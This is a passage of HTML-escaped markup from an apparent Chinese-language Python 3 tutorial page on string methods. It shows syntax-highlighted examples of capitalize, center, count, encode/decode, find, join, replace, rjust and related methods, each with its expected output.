href=\"https://www.runoob.com/python3/python3-string-upper.html\">upper()</a> 转换字符串中的小写字母为大写</td>\n</tr>\n<tr>\n<td align=\"left\">39</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-zfill.html\">zfill (width)</a> 返回长度为 width 的字符串，原字符串右对齐，前面填充0</td>\n</tr>\n<tr>\n<td align=\"left\">40</td>\n<td align=\"left\"><a href=\"https://www.runoob.com/python3/python3-string-isdecimal.html\">isdecimal()</a> 检查字符串是否只包含十进制字符，如果是返回 true，否则返回 false。</td>\n</tr>\n</tbody></table>\n<h3 id=\"函数示例-1\"><a href=\"#函数示例-1\" class=\"headerlink\" title=\"函数示例\"></a>函数示例</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example from runoob....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str.capitalize() : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>capitalize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># str.capitalize() :  This is string example from runoob....wow!!!</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"[runoob]\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str.center(40, '*') : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>center<span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># str.center(40, '*') :  ****************[runoob]****************</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"www.runoob.com\"</span>\nsub <span class=\"token operator\">=</span> <span class=\"token string\">'o'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str.count('o') : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span>sub<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># str.count('o') :  3</span>\n\nsub <span class=\"token operator\">=</span> <span class=\"token string\">'run'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"str.count('run', 0, 10) : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span>sub<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># str.count('run', 0, 10) :  1</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"菜鸟教程\"</span>\nstr_utf8 <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">)</span>\nstr_gbk <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"GBK\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 菜鸟教程</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UTF-8 编码：\"</span><span class=\"token punctuation\">,</span> str_utf8<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># UTF-8 编码： b'\\xe8\\x8f\\x9c\\xe9\\xb8\\x9f\\xe6\\x95\\x99\\xe7\\xa8\\x8b'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GBK 编码：\"</span><span class=\"token punctuation\">,</span> str_gbk<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># GBK 编码： b'\\xb2\\xcb\\xc4\\xf1\\xbd\\xcc\\xb3\\xcc'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UTF-8 解码：\"</span><span class=\"token punctuation\">,</span> str_utf8<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'UTF-8'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'strict'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># UTF-8 解码： 菜鸟教程</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GBK 解码：\"</span><span class=\"token punctuation\">,</span> str_gbk<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'GBK'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'strict'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># GBK 解码： 菜鸟教程</span>\n\nStr <span class=\"token operator\">=</span> <span class=\"token string\">'Runoob example....wow!!!'</span>\nsuffix <span class=\"token operator\">=</span> <span class=\"token string\">'!!'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Str<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span>suffix<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Ture</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Str<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span>suffix<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\nsuffix <span class=\"token operator\">=</span> <span class=\"token string\">'run'</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Str<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span>suffix<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Str<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span>suffix<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"runoob\\t12345\\tabc\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'原始字符串:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 原始字符串: runoob\t12345\tabc</span>\n\n<span class=\"token comment\"># 默认 8 个空格</span>\n<span class=\"token comment\"># runnob 有 6 个字符，后面的 \\t 填充 2 个空格</span>\n<span class=\"token comment\"># 12345 有 5 个字符，后面的 \\t 填充 3 个空格</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'替换 \\\\t 符号:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>expandtabs<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 替换 \\t 符号: runoob  12345   abc</span>\n\n<span class=\"token comment\"># 2 个空格</span>\n<span class=\"token comment\"># runnob 有 6 个字符，刚好是 2 的 3 倍，后面的 \\t 填充 2 个空格</span>\n<span class=\"token comment\"># 12345 有 5 个字符，不是 2 的倍数，后面的 \\t 填充 1 个空格</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用 2 个空格替换 \\\\t 符号:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>expandtabs<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 使用 2 个空格替换 \\t 符号: runoob  12345 abc</span>\n\n<span class=\"token comment\"># 3 个空格</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用 3 个空格:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>expandtabs<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 使用 3 个空格: runoob   12345 abc</span>\n\n<span class=\"token comment\"># 4 个空格</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用 4 个空格:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>expandtabs<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 使用 4 个空格: runoob  12345   abc</span>\n\n<span class=\"token comment\"># 5 个空格</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用 5 个空格:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>expandtabs<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 使用 5 个空格: runoob    12345     abc</span>\n\n<span class=\"token comment\"># 6 个空格</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'使用 6 个空格:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>expandtabs<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 使用 6 个空格: runoob      12345 abc</span>\n\nstr1 <span class=\"token operator\">=</span> <span class=\"token string\">\"Runoob example....wow!!!\"</span>\nstr2 <span class=\"token operator\">=</span> <span class=\"token string\">\"exam\"</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 7</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 7</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># -1</span>\n\nstr1 <span class=\"token operator\">=</span> <span class=\"token string\">\"Runoob example....wow!!!\"</span>\nstr2 <span class=\"token operator\">=</span> <span class=\"token string\">\"exam\"</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 7</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 7</span>\n<span class=\"token comment\"># print(str1.index(str2, 10))  # 异常</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"runoob2016\"</span>  <span class=\"token comment\"># 字符串没有空格</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isalnum<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"www.runoob.com\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isalnum<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"runoob\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isalpha<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Ture</span>\n\n<span class=\"token comment\"># 字母和中文文字</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"runoob菜鸟教程\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isalpha<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Ture</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Runoob example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isalpha<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"123456\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isdigit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Runoob example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isdigit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"RUNOOB example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>islower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"runoob example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>islower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"runoob2016\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isnumeric<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"23443434\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isnumeric<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"       \"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isspace<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Runoob example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isspace<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"This Is String Example...Wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>istitle<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"This is string example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>istitle<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"THIS IS STRING EXAMPLE....WOW!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isupper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># True</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"THIS is string example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>isupper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># False</span>\n\ns1 <span class=\"token operator\">=</span> <span class=\"token string\">\"-\"</span>\ns2 <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\nseq <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"u\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"o\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"o\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"b\"</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 字符串序列</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>seq<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># r-u-n-o-o-b</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>seq<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># runoob</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"runoob\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 字符串长度</span>\n<span class=\"token comment\"># 6</span>\nl <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 5</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Runoob example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># Runoob example....wow!!!**************************</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Runoob EXAMPLE....WOW!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># runoob example....wow!!!</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"     this is string example....wow!!!     \"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>lstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># this is string example....wow!!!</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"88888888this is string example....wow!!!8888888\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>lstrip<span class=\"token punctuation\">(</span><span class=\"token string\">'8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># this is string example....wow!!!8888888</span>\n\nintab <span class=\"token operator\">=</span> <span class=\"token string\">\"aeiou\"</span>\nouttab <span class=\"token operator\">=</span> <span class=\"token string\">\"12345\"</span>\ntrantab <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>maketrans<span class=\"token punctuation\">(</span>intab<span class=\"token punctuation\">,</span> outtab<span class=\"token punctuation\">)</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>translate<span class=\"token punctuation\">(</span>trantab<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># th3s 3s str3ng 2x1mpl2....w4w!!!</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"runoob\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"最大字符: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 最大字符: u</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"runoob\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"最小字符: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">min</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 最小字符: b</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"www.w3cschool.cc\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"菜鸟教程旧地址：\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 菜鸟教程旧地址： www.w3cschool.cc</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"菜鸟教程新地址：\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"w3cschool.cc\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"runoob.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 菜鸟教程新地址： www.runoob.com</span>\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"is\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"was\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># thwas was string example....wow!!!</span>\n\nstr1 <span class=\"token operator\">=</span> <span class=\"token string\">\"this is really a string example....wow!!!\"</span>\nstr2 <span class=\"token operator\">=</span> <span class=\"token string\">\"is\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>rfind<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 5</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>rfind<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 5</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>rfind<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># -1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># -1</span>\n\nstr1 <span class=\"token operator\">=</span> <span class=\"token string\">\"this is really a string example....wow!!!\"</span>\nstr2 <span class=\"token operator\">=</span> <span class=\"token string\">\"is\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>rindex<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 5</span>\n<span class=\"token comment\"># print (str1.rindex(str2,10))</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"this is string example....wow!!!\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ******************this is string example....wow!!!</span>\n\n<span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"     this is string example....wow!!!     \"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token 